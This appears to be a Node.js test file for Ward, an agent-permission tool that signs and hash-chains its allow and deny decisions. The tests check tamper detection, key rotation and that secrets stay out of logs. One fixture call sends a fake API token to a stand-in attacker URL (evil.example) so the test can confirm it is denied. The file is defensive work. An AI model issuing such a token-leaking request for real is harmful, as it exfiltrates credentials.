// Ward 0.3.7: signed, hash-chained decision receipts.
import { test, describe, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, readFileSync, writeFileSync, statSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { spawn, spawnSync } from 'node:child_process';
import { parseWard } from '../dist/index.js';
import { evaluateWithLedger } from '../dist/ledger/index.js';
import { verifyReceiptLog, receiptLogPath, loadReceiptKeys, receiptsEnabled, canonicalJson } from '../dist/receipts/index.js';

const WARD = (verification = 'required: true\nfrequency: every_action\n') => parseWard(`---
ward: "1.0"
agent: receipts-test
---

## Filesystem

allow:
  - read: /repo/**
deny:
  - read: /repo/secrets/**
default: deny

## Network

allow:
  - url: "https://api.github.com/**"
default: deny

## Capabilities

default: allow

## Verification

${verification}`);

const M = { Read: { capability: 'file_read', pathField: 'file_path', fsOp: 'read' }, WebFetch: { capability: 'http_request', urlField: 'url' } };
let dir;
beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), 'ward-receipts-'));
  process.env.WEAVE_RECEIPT_DIR = join(dir, 'receipts');
  process.env.WEAVE_RECEIPT_KEY_FILE = join(dir, 'keys', 'ward-receipts.pem');
  process.env.WEAVE_LEDGER_DIR = join(dir, 'ledger');
  delete process.env.WEAVE_RECEIPTS;
});

const policy = WARD();
const log = () => receiptLogPath('receipts-test');
const lines = () => readFileSync(log(), 'utf8').trim().split('\n');
const decide = (tool, args, session = 's1') => evaluateWithLedger(policy, tool, args, { mappings: M, cwd: '/repo', session, surface: 'claude-code' }).decision;
const writeSome = () => {
  decide('Read', { file_path: '/repo/src/a.ts' });
  decide('Read', { file_path: '/repo/secrets/key' });
  decide('WebFetch', { url: 'https://api.github.com/user' });
  decide('WebFetch', { url: 'https://evil.example/c?token=sk-ant-api03-SECRETSECRETSECRETSECRET' });
};

describe('writing', () => {
  test('on when WARD.md Verification is required, or WEAVE_RECEIPTS=1; off otherwise', () => {
    assert.equal(receiptsEnabled(policy), true);
    assert.equal(receiptsEnabled(WARD('required: false\n')), false);
    assert.equal(receiptsEnabled(WARD('required: true\nfrequency: session_end\n')), false);
    process.env.WEAVE_RECEIPTS = '1';
    assert.equal(receiptsEnabled(WARD('required: false\n')), true);
    process.env.WEAVE_RECEIPTS = '0';
    assert.equal(receiptsEnabled(policy), false);
  });

  test('every decision gets a receipt that verifies; files are private', () => {
    writeSome();
    const r = verifyReceiptLog(log());
    assert.equal(r.ok, true, JSON.stringify(r.problems));
    assert.equal(r.receipts, 4);
    assert.deepEqual(r.decisions, { allow: 2, deny: 2 });
    assert.equal(r.head, JSON.parse(lines().at(-1)).hash);
    assert.equal(statSync(log()).mode & 0o777, 0o600);
    assert.equal(statSync(process.env.WEAVE_RECEIPT_KEY_FILE).mode & 0o777, 0o600);
    const first = JSON.parse(lines()[1]);
    assert.equal(first.surface, 'claude-code');
    assert.equal(first.session, 's1');
    assert.match(first.policyDigest, /^sha256:[0-9a-f]{64}$/);
  });

  test('no argument values reach the log, and digests are keyed', () => {
    writeSome();
    const text = readFileSync(log(), 'utf8');
    for (const value of ['/repo/secrets/key', 'sk-ant-api03', 'evil.example/c', 'token=']) assert.ok(!text.includes(value), value);
    const [a, b] = [JSON.parse(lines()[1]), JSON.parse(lines()[2])];
    assert.notEqual(a.argsDigest, b.argsDigest);
    decide('Read', { file_path: '/repo/src/a.ts' });
    assert.equal(JSON.parse(lines().at(-1)).argsDigest, a.argsDigest, 'same arguments, same digest');
  });

  test('a policy without Verification writes nothing', () => {
    evaluateWithLedger(WARD('required: false\n'), 'Read', { file_path: '/repo/a' }, { mappings: M });
    assert.throws(() => statSync(log()));
  });
});

describe('tampering is detected', () => {
  const tamper = (fn) => { const l = lines(); fn(l); writeFileSync(log(), l.join('\n') + '\n'); return verifyReceiptLog(log()); };

  test('an edited decision', () => {
    writeSome();
    const r = tamper((l) => { const x = JSON.parse(l[2]); x.decision = 'allow'; l[2] = JSON.stringify(x); });
    assert.equal(r.ok, false);
    assert.match(r.problems[0].problem, /edited/);
  });

  test('a deleted receipt', () => {
    writeSome();
    const r = tamper((l) => l.splice(2, 1));
    assert.equal(r.ok, false);
    assert.ok(r.problems.some((p) => /missing or out of order|does not link/.test(p.problem)));
  });

  test('reordered receipts', () => {
    writeSome();
    const r = tamper((l) => { [l[2], l[3]] = [l[3], l[2]]; });
    assert.equal(r.ok, false);
  });

  test('an edit re-hashed but not re-signed', () => {
    writeSome();
    const r = tamper((l) => {
      const x = JSON.parse(l[2]); x.decision = 'allow';
      const { hash, sig, ...body } = x;
      x.hash = 'sha256:' + require_sha256(canonicalJson(body));
      l[2] = JSON.stringify(x);
    });
    assert.equal(r.ok, false);
    assert.ok(r.problems.some((p) => /signature is invalid/.test(p.problem)));
  });

  test('a whole log forged with another key fails against the expected key', () => {
    writeSome();
    const expected = loadReceiptKeys().publicKeyB64;
    // The forger regenerates everything with their own key
    rmSync(log());
    process.env.WEAVE_RECEIPT_KEY_FILE = join(dir, 'keys', 'forger.pem');
    writeSome();
    assert.equal(verifyReceiptLog(log()).ok, true, 'internally consistent');
    const r = verifyReceiptLog(log(), { publicKey: expected });
    assert.equal(r.ok, false);
    assert.match(r.problems[0].problem, /not the expected key/);
  });

  test('removing the newest receipts changes the head (record it elsewhere)', () => {
    writeSome();
    const head = verifyReceiptLog(log()).head;
    const r = tamper((l) => l.pop());
    assert.equal(r.ok, true, 'a shorter chain is still a valid chain');
    assert.notEqual(r.head, head);
  });
});

test('a new signing key continues the chain under a new header', () => {
  decide('Read', { file_path: '/repo/a' });
  process.env.WEAVE_RECEIPT_KEY_FILE = join(dir, 'keys', 'rotated.pem');
  decide('Read', { file_path: '/repo/b' });
  const r = verifyReceiptLog(log());
  assert.equal(r.ok, true, JSON.stringify(r.problems));
  assert.equal(r.keys.length, 2);
  assert.equal(r.receipts, 2);
});

test('parallel hook processes keep one unbroken chain', async () => {
  const env = { ...process.env };
  const script = `
    import { parseWard } from ${JSON.stringify(new URL('../dist/index.js', import.meta.url).href)};
    import { evaluateWithLedger } from ${JSON.stringify(new URL('../dist/ledger/index.js', import.meta.url).href)};
    const p = parseWard('---\\nward: "1.0"\\nagent: receipts-test\\n---\\n\\n## Capabilities\\n\\ndefault: allow\\n\\n## Verification\\n\\nrequired: true\\n');
    for (let i = 0; i < 8; i++) evaluateWithLedger(p, 'x', { i }, { session: String(process.pid) });`;
  await Promise.all(Array.from({ length: 5 }, () => new Promise((res, rej) => {
    const c = spawn(process.execPath, ['--input-type=module', '-e', script], { env, stdio: 'inherit' });
    c.on('exit', (code) => (code === 0 ? res() : rej(new Error(`exit ${code}`))));
  })));
  const r = verifyReceiptLog(log());
  assert.equal(r.ok, true, JSON.stringify(r.problems.slice(0, 3)));
  assert.equal(r.receipts, 40);
});

test('CLI: verify exits 0 for a good log and 1 for a tampered one', () => {
  writeSome();
  const cli = resolve('dist/cli.js');
  const ok = spawnSync(process.execPath, [cli, 'receipts', 'verify', log()], { env: process.env, encoding: 'utf8' });
  assert.equal(ok.status, 0, ok.stderr);
  assert.match(ok.stdout, /4 receipts verified/);
  const key = spawnSync(process.execPath, [cli, 'receipts', 'key'], { env: process.env, encoding: 'utf8' }).stdout.trim();
  assert.equal(spawnSync(process.execPath, [cli, 'receipts', 'verify', log(), `--key=${key}`], { env: process.env }).status, 0);
  const l = lines(); const x = JSON.parse(l[1]); x.tool = 'Bash'; l[1] = JSON.stringify(x); writeFileSync(log(), l.join('\n') + '\n');
  const bad = spawnSync(process.execPath, [cli, 'receipts', 'verify', log(), '--json'], { env: process.env, encoding: 'utf8' });
  assert.equal(bad.status, 1);
  assert.equal(JSON.parse(bad.stdout).ok, false);
});

function require_sha256(s) {
  return spawnSync(process.execPath, ['-e', `process.stdout.write(require('crypto').createHash('sha256').update(${JSON.stringify(s)}).digest('hex'))`], { encoding: 'utf8' }).stdout;
}

// Ward 0.3.12: a folder Ward can't write to (a harness sandbox, a read-only
// home) used to send the receipt lock into an endless retry loop, so the hook
// timed out and harnesses that treat a timeout as allow let the call through.
describe('unwritable receipt folder', () => {
  test('gives up at once and still decides', { skip: process.getuid?.() === 0 && 'root ignores permissions' }, async () => {
    const { mkdirSync, chmodSync } = await import('node:fs');
    const ro = join(dir, 'ro');
    mkdirSync(join(ro, 'receipts'), { recursive: true });
    mkdirSync(join(ro, 'keys'), { recursive: true });
    const keyFile = join(ro, 'keys', 'ward-receipts.pem');
    process.env.WEAVE_RECEIPT_KEY_FILE = keyFile;
    loadReceiptKeys(); // create the key while the folder is writable
    chmodSync(join(ro, 'receipts'), 0o500);
    const script = `
      import { parseWard } from ${JSON.stringify(resolve('dist/index.js'))};
      import { evaluateWithLedger } from ${JSON.stringify(resolve('dist/ledger/index.js'))};
      const p = parseWard(${JSON.stringify(readFileSync(new URL(import.meta.url), 'utf8').match(/parseWard\(`([\s\S]*?)\$\{verification\}`\)/)[1] + 'required: true\n')});
      const t = Date.now();
      const d = evaluateWithLedger(p, 'Read', { file_path: '/repo/secrets/key' }, { mappings: { Read: { capability: 'file_read', pathField: 'file_path', fsOp: 'read' } }, cwd: '/repo' }).decision;
      process.stdout.write(JSON.stringify({ d, ms: Date.now() - t }));`;
    try {
      const r = spawnSync(process.execPath, ['--input-type=module', '-e', script], {
        env: { ...process.env, WEAVE_RECEIPT_DIR: join(ro, 'receipts'), WEAVE_RECEIPT_KEY_FILE: keyFile },
        encoding: 'utf8', timeout: 8000,
      });
      assert.equal(r.signal, null, 'the decision must not hang');
      const out = JSON.parse(r.stdout);
      assert.equal(out.d, 'deny');
      assert.ok(out.ms < 1500, `took ${out.ms}ms`);
    } finally {
      chmodSync(join(ro, 'receipts'), 0o700);
    }
  });
});
